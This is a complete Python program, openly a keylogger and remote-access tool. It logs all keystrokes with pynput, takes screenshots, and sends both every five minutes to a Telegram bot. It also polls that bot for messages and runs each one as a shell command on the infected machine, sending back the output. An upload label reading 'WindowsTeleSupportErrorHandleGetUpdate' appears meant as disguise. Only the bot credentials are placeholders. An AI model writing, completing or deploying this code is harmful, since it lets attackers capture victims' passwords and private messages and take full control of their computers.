import time
import threading
import os
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
import requests
import subprocess

# ====== TELEGRAM SETUP ======
TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID"

# ====== VARIABLES ======
LOG_FILE = "keylog.txt"
key_buffer = []

# ====== MAPPING KEYS ======
key_map = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.caps_lock: "[CAPSLOCK]"
}

# ====== SEND ERROR TO TELEGRAM ======
def send_error_to_telegram(error_message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": f"⚠️ Error:\n{error_message}"
        })
    except:
        pass  # Don't crash the logger if error reporting fails

# ====== SEND MESSAGE TO TELEGRAM ======
def send_message_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        res = requests.post(url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        })
    except:
        pass

# ====== KEYLOGGING ======
def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        
        if key == keyboard.Key.backspace:
            if key_buffer:
                key_buffer.pop()
            readable = ""
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.tab,
                     keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.alt]:
            key_buffer.append(" ")
            readable = " "
        elif key == keyboard.Key.space:
            readable = " "
        elif key == keyboard.Key.enter:
            readable = "\n"
        elif "Key." in key_str:
            readable = f"[{key_str.split('.')[-1].upper()}]"
        else:
            readable = key_str

        if readable:
            key_buffer.append(readable)
        print(f"{key_buffer}", end="", flush=True)
    except Exception as e:
        send_error_to_telegram(f"Key read error: {e}")

# ====== SEND KEYSTROKES TO TELEGRAM ======
def send_keystrokes_telegram():
    if not key_buffer:
        return
    try:
        data = ''.join(key_buffer)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"🧾 *WindowsTeleSupportErrorHandleGetUpdate* - `{timestamp}`\n```\n{data}\n```"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        res = requests.post(url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        })
        if res.status_code == 200:
            key_buffer.clear()
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
        else:
            send_error_to_telegram(f"Telegram keystroke failed: {res.status_code} {res.text}")
    except Exception as e:
        send_error_to_telegram(f"Telegram keystroke error: {e}")

# ====== CAPTURE AND SEND SCREENSHOT ======
def capture_and_send_screenshot():
    try:
        filename = "screenshot.jpg"
        img = ImageGrab.grab()
        img = img.resize((960, 540))
        img.save(filename, "JPEG", quality=50)

        with open(filename, 'rb') as img_file:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            res = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"photo": img_file})
            if res.status_code == 200:
                os.remove(filename)
            else:
                send_error_to_telegram(f"Telegram screenshot failed: {res.status_code}, {res.text}")
    except Exception as e:
        send_error_to_telegram(f"Screenshot capture error: {e}")

# ====== PERIODIC TASKS ======
def periodic_tasks():
    while True:
        time.sleep(300)  # 5 minutes
        send_keystrokes_telegram()
        capture_and_send_screenshot()

# ====== TELEGRAM COMMAND LISTENER ======
def check_for_commands():
    last_update_id = None
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {"timeout": 100, "offset": last_update_id + 1 if last_update_id else None}
            res = requests.get(url, params=params)
            if res.status_code == 200:
                updates = res.json()["result"]
                for update in updates:
                    last_update_id = update["update_id"]
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        if str(chat_id) == TELEGRAM_CHAT_ID:
                            command_text = update["message"]["text"]
                            print("command text is, ", command_text)
                            try:
                                # Execute the command on the PC shell
                                output = subprocess.check_output(
                                    command_text, shell=True, stderr=subprocess.STDOUT, universal_newlines=True
                                )
                                message = f"✅ Command executed:\n`{command_text}`\nOutput:\n```\n{output}\n```"
                                # print(message)
                                send_message_to_telegram(message[0:4000])
                            except subprocess.CalledProcessError as e:
                                error_message = f"❌ Command failed:\n`{command_text}`\nError:\n```\n{e.output}\n```"
                                # print(error_message)
                                send_message_to_telegram(error_message)
            else:
                send_error_to_telegram(f"Failed to fetch updates: {res.status_code}")
        except Exception as e:
            send_error_to_telegram(f"Command check error: {e}")
        time.sleep(3)


# ====== START BACKGROUND THREADS ======
threading.Thread(target=periodic_tasks, daemon=True).start()
threading.Thread(target=check_for_commands, daemon=True).start()

# ====== START KEYLOGGER ======
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    send_error_to_telegram("Keylogger exited with KeyboardInterrupt.")
